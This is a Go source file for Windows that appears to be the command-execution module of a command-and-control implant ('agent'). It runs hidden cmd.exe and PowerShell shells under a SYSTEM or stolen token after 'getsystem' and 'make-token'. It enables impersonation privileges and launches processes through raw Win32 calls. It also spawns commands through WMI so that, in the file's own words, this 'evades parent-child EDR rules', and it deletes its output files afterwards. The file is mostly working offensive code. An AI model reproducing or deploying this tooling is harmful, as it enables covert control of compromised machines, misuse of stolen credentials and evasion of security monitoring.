//go:build windows

package agent

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procCreateProcessWithTokenW2 = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW")
	procCreateProcessAsUserW2    = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessAsUserW")
	procDeleteFileA2             = windows.NewLazySystemDLL("kernel32.dll").NewProc("DeleteFileA")

	// WMI COM procs (ole32.dll) — used by runShellOpsec
	wmiOle32           = windows.NewLazySystemDLL("ole32.dll")
	procCoInitializeEx = wmiOle32.NewProc("CoInitializeEx")
	procCoInitSecurity = wmiOle32.NewProc("CoInitializeSecurity")
	procCoCreateInst   = wmiOle32.NewProc("CoCreateInstance")
	procCoSetProxy     = wmiOle32.NewProc("CoSetProxyBlanket")
	procCoUninitialize = wmiOle32.NewProc("CoUninitialize")
)

func winErrno(err error) uint32 {
	if errno, ok := err.(syscall.Errno); ok {
		return uint32(errno)
	}
	return 0
}

func makeShellCmd(cmd string) *exec.Cmd {
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/S /C "` + cmd + `"`,
		HideWindow: true,
	}
	return c
}

// makeInteractiveShellCmd keeps the interactive shell on the SYSTEM token
// after getsystem.  os/exec propagates its stdin/stdout/stderr pipes while the
// token is supplied through the Windows STARTUPINFO process attributes.
func makeInteractiveShellCmd(shell string) *exec.Cmd {
	var c *exec.Cmd
	if shell == "ps" || shell == "powershell" {
		c = exec.Command("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive")
	} else {
		c = exec.Command("cmd.exe", "/Q")
	}
	if gSystemToken != 0 {
		c.SysProcAttr = &windows.SysProcAttr{
			Token:      syscall.Token(gSystemToken),
			HideWindow: true,
		}
	} else {
		c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	}
	return c
}

// shellDirect runs a shell command via cmd.exe and captures output to a temp file.
// Unlike exec.Cmd with Stdout pipes, this approach prevents grandchild processes
// started with 'start /b' from inheriting the pipe write handle, which would cause
// the goroutine reading from the pipe to block indefinitely until the grandchild exits.
func shellDirect(cmd string) string {
	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
	tmpDir := os.TempDir()
	if len(tmpDir) > 0 && tmpDir[len(tmpDir)-1] != '\\' {
		tmpDir += `\`
	}
	outPath := tmpDir + "sbo" + uid + ".tmp"

	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`,
		HideWindow: true,
	}
	// No Stdout/Stderr set — cmd.exe writes directly to the temp file.
	// This prevents any grandchild processes from inheriting our pipe handles.

	if err := c.Start(); err != nil {
		_ = os.Remove(outPath)
		return fmt.Sprintf("[error: shell: %v]", err)
	}
	done := make(chan error, 1)
	go func() { done <- c.Wait() }()
	select {
	case <-done:
	case <-time.After(60 * time.Second):
		c.Process.Kill()
		<-done
	}
	data, _ := os.ReadFile(outPath)
	_ = os.Remove(outPath)
	return string(data)
}

// runShellSystemHook runs cmd using temp-file redirection on Windows, optionally
// via the stored SYSTEM or stolen token. Using temp files instead of pipes avoids
// handle inheritance into grandchild processes (e.g. 'start /b agent.exe').
func runShellSystemHook(cmd string) (out string, handled bool, err error) {
	if gSystemToken != 0 || stolenToken != 0 {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		// Prefer stolenToken (make-token credentials) as the child's primary
		// token so UNC network access uses those credentials rather than the
		// machine account.  Fall back to gSystemToken when stolenToken is absent.
		childTok := windows.Handle(stolenToken)
		if childTok == 0 {
			childTok = windows.Handle(gSystemToken)
		}
		return shellDirectAsSystem(cmd, childTok), true, nil
	}
	// Non-elevated case: always use temp-file approach on Windows to avoid
	// pipe handle inheritance into background processes.
	return shellDirect(cmd), true, nil
}

// shellDirectAsSystem creates a cmd.exe process using the supplied primary token
// via raw Win32 calls, capturing stdout+stderr via command-line redirection to
// a temp file.  Using STARTF_USESTDHANDLES with CreateProcessWithTokenW causes
// STATUS_DLL_INIT_FAILED because seclogon cannot duplicate pipe handles across
// session boundaries.
func shellDirectAsSystem(cmd string, token windows.Handle) string {
	tick, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetTickCount").Call()
	uid := fmt.Sprintf("%016x", uint64(os.Getpid())^uint64(tick))
	outPath := `C:\Windows\Temp\sbo` + uid + `.tmp`
	shellArgs := `/d /c ` + cmd + ` > "` + outPath + `" 2>&1`
	wargs, _ := syscall.UTF16PtrFromString(shellArgs)
	wargsAsUser, _ := syscall.UTF16PtrFromString(shellArgs)

	// Drop any thread impersonation (from make-token LOGON_NEW_CREDENTIALS) so
	// the process primary token (SYSTEM) provides SeAssignPrimaryTokenPrivilege
	// for CreateProcess*W.  Restore the impersonation after the child is started.
	var savedImp windows.Token
	{
		var hTh windows.Token
		if err := windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_ALL_ACCESS, true, &hTh); err == nil {
			var dup windows.Token
			procDuplicateTokenEx.Call(
				uintptr(hTh),
				uintptr(windows.TOKEN_ALL_ACCESS),
				0,
				2, // SecurityImpersonation
				2, // TokenImpersonation
				uintptr(unsafe.Pointer(&dup)),
			)
			savedImp = dup
			windows.CloseHandle(windows.Handle(hTh))
			procRevertToSelf2.Call()
		}
	}

	_ = enablePrivilege("SeImpersonatePrivilege")
	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
	_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
	_ = enableTokenPrivilege(token, "SeImpersonatePrivilege")
	_ = enableTokenPrivilege(token, "SeIncreaseQuotaPrivilege")
	_ = enableTokenPrivilege(token, "SeAssignPrimaryTokenPrivilege")

	// No STARTF_USESTDHANDLES — the child writes its own output file.
	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE

	var pi windows.ProcessInformation
	cmdApp, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)
	cmdCwd, _ := syscall.UTF16PtrFromString(`C:\Windows\System32`)
	var withTokenErr, asUserErr, impersonateErr uint32
	var r uintptr
	r, _, e := procCreateProcessWithTokenW2.Call(
		uintptr(token), 0,
		uintptr(unsafe.Pointer(cmdApp)),
		uintptr(unsafe.Pointer(wargs)),
		0x08000000, 0, uintptr(unsafe.Pointer(cmdCwd)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		withTokenErr = winErrno(e)
		r, _, e = procCreateProcessAsUserW2.Call(
			uintptr(token),
			uintptr(unsafe.Pointer(cmdApp)),
			uintptr(unsafe.Pointer(wargsAsUser)),
			0, 0, 0, 0x08000000, 0,
			uintptr(unsafe.Pointer(cmdCwd)),
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if r == 0 {
			asUserErr = winErrno(e)
		}
	}
	if r == 0 {
		if ir, _, ie := procImpersonateLoggedOnUser.Call(uintptr(token)); ir == 0 {
			impersonateErr = winErrno(ie)
		} else {
			wargsRetry, _ := syscall.UTF16PtrFromString(shellArgs)
			r, _, e = procCreateProcessWithTokenW2.Call(
				uintptr(token), 0, uintptr(unsafe.Pointer(cmdApp)),
				uintptr(unsafe.Pointer(wargsRetry)), 0x08000000, 0,
				uintptr(unsafe.Pointer(cmdCwd)), uintptr(unsafe.Pointer(&si)),
				uintptr(unsafe.Pointer(&pi)))
			if r == 0 {
				withTokenErr = winErrno(e)
			}
			_, _, _ = procRevertToSelf2.Call()
		}
	}
	// Restore thread impersonation regardless of CreateProcess outcome.
	if savedImp != 0 {
		procImpersonateLoggedOnUser.Call(uintptr(savedImp))
		windows.CloseHandle(windows.Handle(savedImp))
	}
	if r == 0 {
		return fmt.Sprintf("[error: SYSTEM shell launch; WithToken=%d; AsUser=%d; Impersonate=%d]",
			withTokenErr, asUserErr, impersonateErr)
	}

	_, _ = windows.WaitForSingleObject(pi.Process, 60000)
	_ = windows.CloseHandle(pi.Process)
	_ = windows.CloseHandle(pi.Thread)

	data, err := os.ReadFile(outPath)
	outPathA, _ := syscall.BytePtrFromString(outPath)
	_, _, _ = procDeleteFileA2.Call(uintptr(unsafe.Pointer(outPathA)))
	if err != nil || len(data) == 0 {
		return fmt.Sprintf("[error: SYSTEM shell capture empty; WithToken=%d; AsUser=%d]",
			withTokenErr, asUserErr)
	}
	return string(data)
}

// enableTokenPrivilege adjusts a privilege on a duplicated primary token.
// The caller may not have every privilege in a filtered token, so failures
// are intentionally returned to the caller and handled as launch diagnostics.
func enableTokenPrivilege(token windows.Handle, name string) error {
	privName, _ := syscall.UTF16PtrFromString(name)
	var luid windows.LUID
	r, _, e := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return e
	}
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED}},
	}
	r, _, e = procAdjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if r == 0 {
		return e
	}
	if errno, ok := e.(syscall.Errno); ok && errno == 1300 {
		return fmt.Errorf("privilege not held by token")
	}
	return nil
}

// wmiVariant is a minimal Go representation of Windows VARIANT (16 bytes on x64).
// Layout matches: vt(2) + reserved(6) + value-union(8).
type wmiVariant struct {
	vt  uint16
	_   [6]byte
	val uintptr
}

// wmiGUID holds a Windows GUID in the wire format used by CoCreateInstance.
type wmiGUID struct {
	data1 uint32
	data2 uint16
	data3 uint16
	data4 [8]byte
}

var (
	wmiClsidLocator = wmiGUID{0x4590f811, 0x1d3a, 0x11d0, [8]byte{0x89, 0x1f, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}}
	wmiIidLocator   = wmiGUID{0xdc12a687, 0x737f, 0x11cf, [8]byte{0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}}
)

// wmiCall dispatches a COM vtable method at index idx on the COM object at ptr.
// It is identical to clrVtblCall but with uintptr return for pointer-out paths.
func wmiCall(ptr uintptr, idx int, args ...uintptr) uintptr {
	if ptr == 0 {
		return 0x80004003 // E_POINTER
	}
	vtbl := *(*uintptr)(unsafe.Pointer(ptr))
	fn := *(*uintptr)(unsafe.Pointer(vtbl + uintptr(idx)*8))
	all := make([]uintptr, 0, 1+len(args))
	all = append(all, ptr)
	all = append(all, args...)
	r, _, _ := syscall.SyscallN(fn, all...)
	return r
}

// wmiRelease calls IUnknown::Release (vtbl[2]) on a COM object and zeros ptr.
func wmiRelease(ptr *uintptr) {
	if ptr != nil && *ptr != 0 {
		wmiCall(*ptr, 2)
		*ptr = 0
	}
}

// wmiCreateProcess uses WMI Win32_Process.Create to spawn cmdLine as a child of
// WmiPrvSE.exe, avoiding any PROCESS_CREATE_PROCESS handle or attribute list.
// Returns the PID of the spawned process, or 0 on failure.
func wmiCreateProcess(cmdLine string) uint32 {
	bstrOf := func(s string) uintptr {
		ws, _ := syscall.UTF16PtrFromString(s)
		r, _, _ := sysAllocString.Call(uintptr(unsafe.Pointer(ws)))
		return r
	}
	freeBSTR := func(b *uintptr) {
		if b != nil && *b != 0 {
			sysFreeString.Call(*b)
			*b = 0
		}
	}

	// CoInitializeEx(NULL, COINIT_MULTITHREADED=0)
	r, _, _ := procCoInitializeEx.Call(0, 0)
	if r != 0 && r != 0x80010106 { // S_OK or RPC_E_CHANGED_MODE
		return 0
	}
	procCoInitSecurity.Call(0, uintptr(0xFFFFFFFF), 0, 0, 6, 3, 0, 0, 0)
	defer procCoUninitialize.Call()

	// CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER=1, IID_IWbemLocator, &pLoc)
	var pLoc uintptr
	r, _, _ = procCoCreateInst.Call(
		uintptr(unsafe.Pointer(&wmiClsidLocator)), 0, 1,
		uintptr(unsafe.Pointer(&wmiIidLocator)),
		uintptr(unsafe.Pointer(&pLoc)),
	)
	if r != 0 || pLoc == 0 {
		return 0
	}
	defer wmiRelease(&pLoc)

	// IWbemLocator::ConnectServer [vtbl 3] → IWbemServices
	bsNS := bstrOf(`ROOT\CIMV2`)
	defer freeBSTR(&bsNS)
	var pSvc uintptr
	r = wmiCall(pLoc, 3, bsNS, 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&pSvc)))
	if r != 0 || pSvc == 0 {
		return 0
	}
	defer wmiRelease(&pSvc)
	procCoSetProxy.Call(pSvc, 10, 0, 0, 4, 3, 0, 0) // WINNT, NONE, CALL, IMPERSONATE

	// IWbemServices::GetObject [vtbl 6] → Win32_Process class
	bsCls := bstrOf("Win32_Process")
	defer freeBSTR(&bsCls)
	var pCls uintptr
	r = wmiCall(pSvc, 6, bsCls, 0, 0, uintptr(unsafe.Pointer(&pCls)), 0)
	if r != 0 || pCls == 0 {
		return 0
	}
	defer wmiRelease(&pCls)

	// IWbemClassObject::GetMethod [vtbl 20] → in-params class for "Create"
	methW, _ := syscall.UTF16PtrFromString("Create")
	var pInParam uintptr
	r = wmiCall(pCls, 20, uintptr(unsafe.Pointer(methW)), 0,
		uintptr(unsafe.Pointer(&pInParam)), 0)
	if r != 0 || pInParam == 0 {
		return 0
	}
	defer wmiRelease(&pInParam)

	// IWbemClassObject::SpawnInstance [vtbl 16] → writable in-params instance
	var pInst uintptr
	r = wmiCall(pInParam, 16, 0, uintptr(unsafe.Pointer(&pInst)))
	if r != 0 || pInst == 0 {
		return 0
	}
	defer wmiRelease(&pInst)

	// IWbemClassObject::Put [vtbl 5] — set CommandLine property (VT_BSTR=8)
	propW, _ := syscall.UTF16PtrFromString("CommandLine")
	bsCmdLine := bstrOf(cmdLine)
	v := wmiVariant{vt: 8}
	v.val = bsCmdLine
	wmiCall(pInst, 5, uintptr(unsafe.Pointer(propW)), 0, uintptr(unsafe.Pointer(&v)), 0)
	procVariantClear.Call(uintptr(unsafe.Pointer(&v)))

	// IWbemServices::ExecMethod [vtbl 24] — call Win32_Process.Create
	bsCls2 := bstrOf("Win32_Process")
	bsMeth := bstrOf("Create")
	defer freeBSTR(&bsCls2)
	defer freeBSTR(&bsMeth)
	var pOut uintptr
	wmiCall(pSvc, 24, bsCls2, bsMeth, 0, 0, pInst, uintptr(unsafe.Pointer(&pOut)), 0)
	defer wmiRelease(&pOut)

	// IWbemClassObject::Get [vtbl 4] — read ProcessId from output object
	if pOut == 0 {
		return 0
	}
	pidW, _ := syscall.UTF16PtrFromString("ProcessId")
	var vPid wmiVariant
	wmiCall(pOut, 4, uintptr(unsafe.Pointer(pidW)), 0, uintptr(unsafe.Pointer(&vPid)), 0, 0)
	var pid uint32
	if vPid.vt == 3 || vPid.vt == 19 { // VT_I4 or VT_UI4
		pid = uint32(vPid.val)
	}
	procVariantClear.Call(uintptr(unsafe.Pointer(&vPid)))
	return pid
}

// runShellOpsec executes cmd via WMI Win32_Process.Create so the spawned process
// is a child of WmiPrvSE.exe, not of this agent — evades parent-child EDR rules.
func runShellOpsec(cmd string) string {
	uid := fmt.Sprintf("%08x%016x", os.Getpid(), time.Now().UnixNano())
	outPath := `C:\ProgramData\sbo` + uid + `.tmp`
	cmdLine := `cmd.exe /d /c ` + cmd + ` > "` + outPath + `" 2>&1`

	pid := wmiCreateProcess(cmdLine)
	if pid == 0 {
		return shellDirect(cmd)
	}

	h, e := windows.OpenProcess(windows.SYNCHRONIZE, false, pid)
	if e == nil {
		windows.WaitForSingleObject(h, 30000)
		windows.CloseHandle(h)
	} else {
		time.Sleep(10 * time.Second)
	}

	data, _ := os.ReadFile(outPath)
	_ = os.Remove(outPath)
	if len(data) == 0 {
		return shellDirect(cmd)
	}
	return string(data)
}
